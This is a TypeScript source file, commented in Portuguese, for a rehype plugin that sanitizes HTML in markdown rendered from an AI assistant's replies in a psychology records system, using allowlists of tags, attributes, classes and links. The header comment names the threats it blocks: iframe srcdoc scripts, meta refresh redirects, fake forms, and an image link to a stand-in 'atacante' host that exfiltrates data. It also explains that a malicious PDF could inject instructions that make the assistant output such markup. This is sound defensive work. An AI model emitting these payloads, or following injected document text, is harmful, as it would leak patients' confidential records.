/**
 * Filtro de HTML do markdown exibido (respostas da Luma e "Ver formatado" das
 * anotações). Plugin rehype, roda DEPOIS do rehype-raw.
 *
 * Por que existe: o Streamdown liga o rehype-raw (HTML livre) e só filtra links
 * e imagens. Testado, ele deixava passar:
 *  - `<iframe srcdoc="<script>…">` — roda com a ORIGEM do site: leria a sessão
 *    da psicóloga e chamaria a API como ela (todo prontuário de todo paciente);
 *  - `<meta http-equiv="refresh">` — manda a página para um site falso;
 *  - `<form>`, `<style>` — tela/formulário falsos por cima do sistema;
 *  - `![](https://atacante/?dados=…)` — imagem de qualquer endereço: o navegador
 *    BUSCA a "imagem" e entrega os dados na URL, sem clique nenhum.
 * A Luma lê documentos e sessões; um PDF com texto malicioso pode induzi-la a
 * devolver exatamente isso. Por isso aqui é LISTA DO QUE PODE — o resto sai.
 */

type No = {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: No[];
};

/** Só formatação de texto. */
const TAGS = new Set([
  "p", "br", "hr", "strong", "b", "em", "i", "u", "s", "del", "ins", "mark", "sub", "sup", "small",
  "h1", "h2", "h3", "h4", "h5", "h6", "ul", "ol", "li", "blockquote", "code", "pre", "span", "div",
  "a", "table", "thead", "tbody", "tfoot", "tr", "th", "td", "input", "section", "details", "summary",
]);

/** Saem COM o conteúdo (o texto de dentro também é perigoso ou sem sentido). */
const PERIGOSAS = new Set([
  "script", "style", "iframe", "frame", "frameset", "object", "embed", "applet", "form", "meta", "link",
  "base", "template", "noscript", "svg", "math", "img", "picture", "video", "audio", "source", "track",
  "canvas", "textarea", "select", "option", "button", "dialog", "portal",
]);

/** Atributos permitidos (nomes de propriedade do hast). O resto sai. */
const ATRIBUTOS: Record<string, string[]> = {
  a: ["href", "title"],
  ol: ["start"],
  th: ["align"],
  td: ["align"],
  input: ["type", "checked", "disabled"],
};

/**
 * Classes só as que o próprio markdown gera (código, lista de tarefas, notas de
 * rodapé) e as de cor e alinhamento da barra de anotações. Classe livre deixaria
 * montar uma tela por cima do sistema usando as classes do site (`fixed inset-0 z-50 …`).
 */
const CLASSE_OK = /^(language-[\w+-]+|contains-task-list|task-list-item|footnotes?|sr-only|data-footnote[\w-]*|nota-cor-(vermelho|azul|verde|roxo)|nota-(centro|direita|justificado))$/;

/** Link só para web, e-mail, telefone ou âncora/rota interna. */
const LINK_OK = /^(https?:|mailto:|tel:|#|\/(?!\/))/i;

function limparPropriedades(tag: string, props: Record<string, unknown> = {}): Record<string, unknown> {
  const permitidos = ATRIBUTOS[tag] ?? [];
  const saida: Record<string, unknown> = {};
  for (const nome of permitidos) if (nome in props) saida[nome] = props[nome];
  const classes = props.className;
  if (Array.isArray(classes)) {
    const boas = classes.filter((c) => typeof c === "string" && CLASSE_OK.test(c));
    if (boas.length) saida.className = boas;
  }
  if (tag === "a") {
    const href = typeof saida.href === "string" ? saida.href.trim() : "";
    if (!LINK_OK.test(href)) delete saida.href;
  }
  return saida;
}

function limpar(no: No): No[] {
  if (no.type === "raw" || no.type === "comment" || no.type === "doctype") return [];
  if (no.type === "element") {
    const tag = (no.tagName ?? "").toLowerCase();
    if (PERIGOSAS.has(tag)) return [];
    // Caixa de lista de tarefas é o único input aceito.
    if (tag === "input" && no.properties?.type !== "checkbox") return [];
    // Tag desconhecida (`<center>`, `<font>`…): fica só o texto de dentro.
    if (!TAGS.has(tag)) return (no.children ?? []).flatMap(limpar);
    return [{ ...no, tagName: tag, properties: limparPropriedades(tag, no.properties), children: (no.children ?? []).flatMap(limpar) }];
  }
  if (no.children) return [{ ...no, children: no.children.flatMap(limpar) }];
  return [no];
}

/** O plugin (uso: `rehypePlugins={[rehypeRaw, rehypeHtmlSeguro, …]}`). */
export function rehypeHtmlSeguro() {
  return (arvore: No) => {
    arvore.children = (arvore.children ?? []).flatMap(limpar);
  };
}

/** Exposto para teste. */
export const limparArvore = (arvore: No): No => ({ ...arvore, children: (arvore.children ?? []).flatMap(limpar) });
